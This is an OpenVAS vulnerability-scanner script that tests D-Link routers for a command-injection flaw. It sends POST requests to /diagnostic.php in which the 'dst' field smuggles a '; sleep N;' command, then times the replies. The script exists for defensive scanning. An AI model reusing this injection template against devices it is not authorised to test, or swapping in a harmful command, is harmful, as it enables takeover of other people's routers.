###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dlink_multiple_devices_58938.nasl 11865 2018-10-12 10:03:43Z cfischer $
#
# Multiple D-Link Products Command Injection and Multiple Information Disclosue Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103691");
  script_bugtraq_id(58938);
  script_version("$Revision: 11865 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_name("Multiple D-Link Products Command Injection and Multiple Information Disclosue Vulnerabilities");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/58938");
  script_xref(name:"URL", value:"http://www.dlink.com/");
  script_xref(name:"URL", value:"http://www.s3cur1ty.de/m1adv2013-017");

  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:03:43 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2013-04-09 12:07:13 +0200 (Tue, 09 Apr 2013)");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("gb_dlink_dir_detect.nasl");
  script_require_ports("Services/www", 80, 8080);
  script_mandatory_keys("host_is_dlink_dir");
  script_tag(name:"solution", value:"Reportedly the issue is fixed. Please contact the vendor for more information.");
  script_tag(name:"summary", value:"Multiple D-Link products are prone to a command-injection
vulnerability and multiple information-disclosure vulnerabilities.

Exploiting these issues could allow an attacker to gain access to
potentially sensitive information and execute arbitrary commands in
the context of the affected device.");
  exit(0);
}

include("http_func.inc");

port = get_kb_item("dlink_dir_port");
if(!port)exit(0);
if(!get_port_state(port))exit(0);

useragent = get_http_user_agent();
host = http_host_name(port:port);

sleep = make_list(3, 5, 10);

foreach i (sleep) {

  ex = 'act=ping&dst=%3b%20sleep ' + i  + '%3b';
  len = strlen(ex);

  req = string("POST /diagnostic.php HTTP/1.1\r\n",
               "Host: ", host,"\r\n",
               "User-Agent: ", useragent, "\r\n",
               "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
               "Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3\r\n",
               "Accept-Encoding: identity\r\n",
               "Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n",
               "Referer: http://",host,"/\r\n",
               "Content-Length: ",len,"\r\n",
               "Cookie: uid=hfaiGzkB4z\r\n",
               "\r\n",
               ex
               );

  start = unixtime();
  result = http_send_recv(port:port, data:req, bodyonly:FALSE);
  stop = unixtime();
  if(stop - start < i || stop - start > (i+5)) exit(99); # not vulnerable
}

security_message(port:port);
exit(0);
